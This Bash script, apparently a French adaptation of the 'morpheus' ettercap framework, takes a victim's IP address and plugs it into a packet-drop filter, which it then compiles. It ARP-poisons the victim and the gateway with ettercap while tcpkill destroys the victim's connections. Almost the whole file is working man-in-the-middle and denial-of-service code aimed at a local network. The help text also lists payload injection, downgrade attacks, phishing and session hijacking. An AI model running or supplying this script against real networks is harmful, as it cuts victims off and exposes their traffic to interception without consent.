## Couleurs BASH
DEFAULT="\e[00m"
BLACK="\e[30m"
RED="\e[31m"
GREEN="\e[32m"
ORANGE="\e[33m"
BLUE="\e[34m"
MAGENTA="\e[35m"
CYAN="\e[36m"
WHITE="\e[37m"

## Effets de texte (défaut, gras, souligné)
export DEF="\e[0;0m"
export BOLD="\e[1m"
export UNDER="\e[4m"


eth0=`ifconfig | grep -v -i "ether" | awk {'print $1'} | sed "s/.$//" | grep "eth" | tail -1` > /dev/null 2>&1
wlan0=`ifconfig | awk {'print $1'} | sed "s/.$//" | grep "wlan" | tail -1` > /dev/null 2>&1
IPeth0=`ifconfig $eth0 | grep -w "inet" | awk '{print $2}'` > /dev/null 2>&1
IPwlan0=`ifconfig $wlan0 | grep -w "inet" | awk '{print $2}'` > /dev/null 2>&1
if [ -z $wlan0 ];then
	if [ -z $IPeth0 ];then
		interface="lo"
	else
		interface=$eth0
	fi
else
	interface=$wlan0
fi
ipprivee=`ifconfig $interface | grep -w "inet" | awk '{print $2}'` > /dev/null 2>&1
ippublique=`wget http://checkip.dyndns.org -O - -o /dev/null | cut -d : -f 2 | cut -d \< -f 1` > /dev/null 2>&1
gateway=`ip route | grep "default" | awk {'print $3'}` > /dev/null 2>&1
session=`hostname`
iprange=`ip route | grep "kernel" | awk {'print $1'}` > /dev/null 2>&1
path=`pwd`




trap ctrl_c INT
ctrl_c() {
echo "" && echo ""
echo -e "$RED$BOLD [-]$DEFAULT$CYAN Nettoyage des fichiers récents$DEFAULT"
mv $IPATH/filters/packet_drop.rb $IPATH/filters/packet_drop.eft > /dev/null 2>&1
# port-forward
# echo "0" > /proc/sys/net/ipv4/ip_forward
sleep 2
rm $IPATH/output/packet_drop.ef > /dev/null 2>&1
cd $IPATH
# stop background running proccess
# sudo pkill ettercap > /dev/null 2>&1
# sudo pkill tcpkill > /dev/null 2>&1
echo -e -n "$MAGENTA [>]$CYAN Appuiez sur ENTRÉE pour afficher les options.$DEFAULT"
read -e -p "
" -n 1 -s
cd
cd $path/../
./suite.sh
}









Colors() {
Escape="\033";
  white="${Escape}[0m";
  RedF="${Escape}[31m";
  GreenF="${Escape}[32m";
  YellowF="${Escape}[33m";
  BlueF="${Escape}[34m";
  CyanF="${Escape}[36m";
Reset="${Escape}[0m";
}




# ---------------------
# Variable declarations
# ---------------------
dtr=`date | awk '{print $4}'`        # grab current hour
V3R="2.3"                            # module version number
cnm="oneiroi_phobetor"               # module codename
DiStR0=`awk '{print $1}' /etc/issue` # grab distribution -  Ubuntu or Kali
cd /root/morpheus
IPATH=`pwd`                          # grab morpheus.sh install path
GaTe=`ip route | grep "default" | awk {'print $3'}` > /dev/null 2>&1    # gateway
IP_RANGE=`ip route | grep "kernel" | awk {'print $1'}` > /dev/null 2>&1 # ip-range
PrompT=`cat $IPATH/settings | egrep -m 1 "PROMPT_DISPLAY" | cut -d '=' -f2` > /dev/null 2>&1
LoGs=`cat $IPATH/settings | egrep -m 1 "WRITE_LOGFILES" | cut -d '=' -f2` > /dev/null 2>&1
IpV=`cat $IPATH/settings | egrep -m 1 "USE_IPV6" | cut -d '=' -f2` > /dev/null 2>&1
Edns=`cat $IPATH/settings | egrep -m 1 "ETTER_DNS" | cut -d '=' -f2` > /dev/null 2>&1
Econ=`cat $IPATH/settings | egrep -m 1 "ETTER_CONF" | cut -d '=' -f2` > /dev/null 2>&1
ApachE=`cat $IPATH/settings | egrep -m 1 "AP_PATH" | cut -d '=' -f2` > /dev/null 2>&1
LoGmSf=`cat $IPATH/settings | egrep -m 1 "LOG_MSF" | cut -d '=' -f2` > /dev/null 2>&1
TcPkiL=`cat $IPATH/settings | egrep -m 1 "TCP_KILL" | cut -d '=' -f2` > /dev/null 2>&1
UsNar=`cat $IPATH/settings | egrep -m 1 "URL_SNARF" | cut -d '=' -f2` > /dev/null 2>&1
MsGnA=`cat $IPATH/settings | egrep -m 1 "MSG_SNARF" | cut -d '=' -f2` > /dev/null 2>&1
PrEfI=`cat $IPATH/settings | egrep -m 1 "PREFIX" | cut -d '=' -f2` > /dev/null 2>&1
DrIn=`cat $IPATH/settings | egrep -m 1 "DRI_NET" | cut -d '=' -f2` > /dev/null 2>&1
RbUdB=`cat $IPATH/settings | egrep -m 1 "REBUILD_DB" | cut -d '=' -f2` > /dev/null 2>&1
IPH_UA=`cat $IPATH/settings | egrep -m 1 "IPHONE_USERAGENT" | cut -d '=' -f2` > /dev/null 2>&1
LUA_PATH=`cat $IPATH/settings | egrep -m 1 "LIB_PATH" | cut -d '=' -f2` > /dev/null 2>&1



# -----------------------------------------
# check if user is root
# and if dependencies are proper installed
# ----------------------------------------
if [ $(id -u) != "0" ]; then
echo ""
echo ${RedF}[☠]${white} we need to be root to run this script...${Reset};
echo ${RedF}[☠]${white} execute [ sudo ./morpheus.sh ] on terminal ${Reset};
exit
fi


apc=`which ettercap`
if [ "$?" != "0" ]; then
echo ""
echo ${RedF}[☠]${white} ettercap '->' not found! ${Reset};
sleep 1
echo ${RedF}[☠]${white} This script requires ettercap to work! ${Reset};
echo ${RedF}[☠]${white} Please run: sudo apt-get install ettercap ${Reset};
echo ${RedF}[☠]${white} to install missing dependencies... ${Reset};
exit
fi



npm=`which nmap`
if [ "$?" != "0" ]; then
echo ""
echo ${RedF}[☠]${white} nmap '->' not found! ${Reset};
sleep 1
echo ${RedF}[☠]${white} This script requires nmap to work! ${Reset};
echo ${RedF}[☠]${white} Please run: sudo apt-get install nmap ${Reset};
echo ${RedF}[☠]${white} to install missing dependencies... ${Reset};
exit
fi



npm=`which apache2`
if [ "$?" != "0" ]; then
echo ""
echo ${RedF}[☠]${white} apache2 '->' not found! ${Reset};
sleep 1
echo ${RedF}[☠]${white} This script requires apache2 to work! ${Reset};
echo ${RedF}[☠]${white} Please run: sudo apt-get install apache ${Reset};
echo ${RedF}[☠]${white} to install missing dependencies... ${Reset};
exit
fi





# ------------------------------------------
# pass arguments to script [ -h ]
# we can use: ./morpheus.sh -h for help menu
# ------------------------------------------
while getopts ":h" opt; do
  case $opt in
    h)
cat << !
---
-- Author: r00t-3xp10it | SSA RedTeam @2018
-- Supported: Linux Kali, Ubuntu, Mint, Parrot OS
-- Suspicious-Shell-Activity (SSA) RedTeam develop @2016
---

   morpheus.sh framework automates tcp/udp packet manipulation tasks by using
   ettercap filters to manipulate target http requests under MitM attacks
   replacing the http packet contents by our own contents befor sending the
   packet back to the host that have request for it (tcp/ip hijacking).

   morpheus ships with a collection of etter filters writen be me to acomplish
   various tasks: replacing images in webpages, replace text in webpages, inject
   payloads using html <form> tag, denial-of-service attack (drop packets from source)
   https/ssh downgrade attacks, redirect target browser traffic to another ip address
   and also gives you the ability to build/compile your filter from scratch and lunch
   it through morpheus framework.

!
   exit
    ;;
    \?)
      echo ${RedF}[x]${white} Invalid option:${RedF} -$OPTARG ${Reset}; >&2
      exit
    ;;
  esac
done




# ---------------------------------------------
# grab Operative System distro to store IP addr
# output = Ubuntu OR Kali OR Parrot OR BackBox
# ---------------------------------------------
InT3R=`netstat -r | grep "default" | awk {'print $8'}` # grab interface in use
case $DiStR0 in
    Kali) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
    Debian) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
    Mint) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}' | cut -d ':' -f2`;;
    Ubuntu) IP=`ifconfig $InT3R | egrep -w "inet" | awk {'print $2'} | cut -d ':' -f2`;;
    Parrot) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
    BackBox) IP=`ifconfig $InT3R | egrep -w "inet" | awk {'print $2'} | cut -d ':' -f2`;;
    elementary) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    *) IP=`zenity --title="☠ Input your IP addr ☠" --text "example: 192.168.1.68" --entry --width 270`;;
esac


# config internal framework settings
if [ -e $Econ ]; then
  cp $Econ /tmp/etter.conf > /dev/null 2>&1
  cp $IPATH/bin/etter.conf $Econ > /dev/null 2>&1
  sleep 1
else
  echo ${RedF}[x]${white} morpheus cant Find:${RedF} $Econ ${Reset};
  echo ${RedF}[x]${white} edit settings File to input path of etter.conf File ${Reset};
  sleep 2
  exit
fi


# ----------------------------------
# bash trap ctrl-c and call ctrl_c()
# ----------------------------------
trap ctrl_c INT
ctrl_c() {
echo -e "$RED[-]$DEFAULT$CYAN CTRL+C - Sortie des taches en cours...$DEFAULT"
# clean logfiles folder at exit
rm $IPATH/logs/parse > /dev/null 2>&1
rm $IPATH/logs/lan.mop > /dev/null 2>&1
rm $IPATH/logs/triggertwo > /dev/nul 2>&1
rm $IPATH/output/firewall.ef > /dev/null 2>&1
rm $IPATH/output/template.ef > /dev/null 2>&1
rm $IPATH/output/redirect.ef > /dev/null 2>&1
rm $IPATH/output/EasterEgg.ef > /dev/null 2>&1
rm $IPATH/output/UserAgent.ef > /dev/null 2>&1
rm $IPATH/output/grab_hosts.ef > /dev/null 2>&1
rm $IPATH/output/packet_drop.ef > /dev/null 2>&1
rm $IPATH/output/img_replace.ef > /dev/null 2>&1
rm $IPATH/output/sidejacking.ef > /dev/null 2>&1
rm $IPATH/output/chat_services.ef > /dev/null 2>&1
rm $IPATH/output/dhcp-discovery.ef > /dev/null 2>&1
rm $IPATH/output/cryptocurrency.ef > /dev/null 2>&1
# revert filters to default stage
mv $IPATH/filters/firewall.rb $IPATH/filters/firewall.eft > /dev/null 2>&1
mv $IPATH/filters/template.rb $IPATH/filters/template.eft > /dev/null 2>&1
mv $IPATH/filters/redirect.rb $IPATH/filters/redirect.eft > /dev/null 2>&1
mv $IPATH/filters/EasterEgg.rb $IPATH/filters/EasterEgg.eft > /dev/null 2>&1
mv $IPATH/filters/UserAgent.rb $IPATH/filters/UserAgent.eft > /dev/null 2>&1
mv $IPATH/filters/grab_hosts.rb $IPATH/filters/grab_hosts.eft > /dev/null 2>&1
mv $IPATH/filters/packet_drop.rb $IPATH/filters/packet_drop.eft > /dev/null 2>&1
mv $IPATH/filters/img_replace.rb $IPATH/filters/img_replace.eft > /dev/null 2>&1
mv $IPATH/filters/sidejacking.rb $IPATH/filters/sidejacking.eft > /dev/null 2>&1
mv $IPATH/filters/chat_services.rb $IPATH/filters/chat_services.eft > /dev/null 2>&1
mv $IPATH/filters/cryptocurrency.rb $IPATH/filters/cryptocurrency.eft > /dev/null 2>&1
mv $IPATH/filters/dhcp-discovery.bak $IPATH/filters/dhcp-discovery.eft > /dev/null 2>&1
mv $IPATH/bin/phishing/EasterEgg.bak $IPATH/bin/phishing/EasterEgg.html > /dev/null 2>&1
rm -r $IPATH/logs/capture > /dev/null 2>&1
rm $ApachE/index.html > /dev/null 2>&1
rm $ApachE/cssbanner.js > /dev/null 2>&1
rm -R $ApachE/"Google Sphere_files" > /dev/null 2>&1
mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
# revert ettercap conf files to default stage
if [ -e $Edns ]; then
mv /tmp/etter.dns $Edns > /dev/null 2>&1
echo -e "$BLUE[...]$DEFAULT$CYAN Extinction d\'Ettercap$DEFAULT"
fi
if [ -e $Econ ]; then
echo -e "$BLUE[...]$DEFAULT$CYAN Extinction d\'Ettercap.conf$DEFAULT"
mv /tmp/etter.conf $Econ > /dev/null 2>&1
fi
sleep 2
exit
}
















# get user input to build filter

echo -e -n "$MAGENTA [>]$DEFAULT$CYAN$CYAN Entrez l'IP de la victime : $DEFAULT"
read rhost
# rhost=$(zenity --title="Entrez l'IP de la victime" --text "(laissez le champ vide pour cible tout le réseau local)" --entry --width 400) > /dev/null 2>&1
gateway=`ip route | grep "default" | awk {'print $3'}` > /dev/null 2>&1

  echo -e "$BLUE [...]$DEFAULT$CYAN Création des fichiers de configuration$DEFAULT"
  sleep 0.5
  cp $IPATH/filters/packet_drop.eft $IPATH/filters/packet_drop.rb > /dev/null 2>&1
  sleep 1

 fil_one=$rhost
  # replace values in template.filter with sed bash command
  cd $IPATH/filters
  sed -i "s|TaRgEt|$fil_one|g" packet_drop.eft # NO dev/null to report file not existence :D
  cd $IPATH
  #xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/packet_drop.eft"
  sleep 0.2

    # compiling packet_drop.eft to be used in ettercap
    echo -e "$BLUE [...]$DEFAULT$CYAN Compilation du fichier packet_drop.eft$DEFAULT"
    xterm -T "Compilation..." -geometry 90x26 -e "etterfilter $IPATH/filters/packet_drop.eft -o $IPATH/output/packet_drop.ef && sleep 1"
    sleep 1
    # port-forward
    # echo "1" > /proc/sys/net/ipv4/ip_forward
    cd $IPATH/logs

      # run mitm+filter
      echo -e "$BLUE [...]$DEFAULT$CYAN ARP Poisonning en cours$DEFAULT"
      echo -e "$ORANGE [!]$DEFAULT$CYAN Entrez $ORANGE[q]$DEFALUT$CYAN pour quitter le phishing$DEFAULT"
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo -e "$MAGENTA [>]$DEFAULT$CYAN Utilisation des réglages IPv6$DEFAULT"
        xterm -T "Ecoute et detruction des packets en transit (CTRL+C pour quitter)" -geometry 120x27 -e "tcpkill -i $InT3R -7 host $fil_one" & ettercap -T -Q -i $InT3R -F $IPATH/output/packet_drop.ef -M ARP /$rhost// /$gateway//
        else
        echo -e "$MAGENTA [>]$DEFAULT$CYAN Utilisation des réglages IPv6$DEFAULT"
        xterm -T "Ecoute et detruction des packets en transit (CTRL+C pour quitter)" -geometry 120x27 -e "tcpkill -i $InT3R -7 host $fil_one" & ettercap -T -Q -i $InT3R -F $IPATH/output/packet_drop.ef -L $IPATH/logs/packet_drop -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo -e "$MAGENTA [>]$DEFAULT$CYAN Utilisation des réglages IPv4$DEFAULT"
        xterm -T "Ecoute et detruction des packets en transit (CTRL+C pour quitter)" -geometry 120x27 -e "tcpkill -i $InT3R -7 host $fil_one" & ettercap -T -Q -i $InT3R -F $IPATH/output/packet_drop.ef -M ARP /$rhost/ /$gateway/
        else
        echo -e "$MAGENTA [>]$DEFAULT$CYAN Utilisation des réglages IPv4$DEFAULT"
        xterm -T "Ecoute et detruction des packets en transit (CTRL+C pour quitter)" -geometry 120x27 -e "tcpkill -i $InT3R -7 host $fil_one" & ettercap -T -Q -i $InT3R -F $IPATH/output/packet_drop.ef -L $IPATH/logs/packet_drop -M ARP /$rhost/ /$gateway/
        fi
      fi

  # clean up
  echo -e "$RED$BOLD [-]$DEFAULT$CYAN Nettoyage des fichiers récents$DEFAULT"
  mv $IPATH/filters/packet_drop.rb $IPATH/filters/packet_drop.eft > /dev/null 2>&1
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2
  rm $IPATH/output/packet_drop.ef > /dev/null 2>&1
  cd $IPATH
  # stop background running proccess
  # sudo pkill ettercap > /dev/null 2>&1
  # sudo pkill tcpkill > /dev/null 2>&1

  echo -e "$RED$BOLD [-]$DEFAULT$CYAN Abandon des taches en cours$DEFAULT"
  sleep 1






echo ""
echo -e -n "$MAGENTA [>]$CYAN Appuiez sur ENTRÉE pour afficher les options.$DEFAULT"
read -e -p "
" -n 1 -s



cd
cd $path/../
./suite.sh
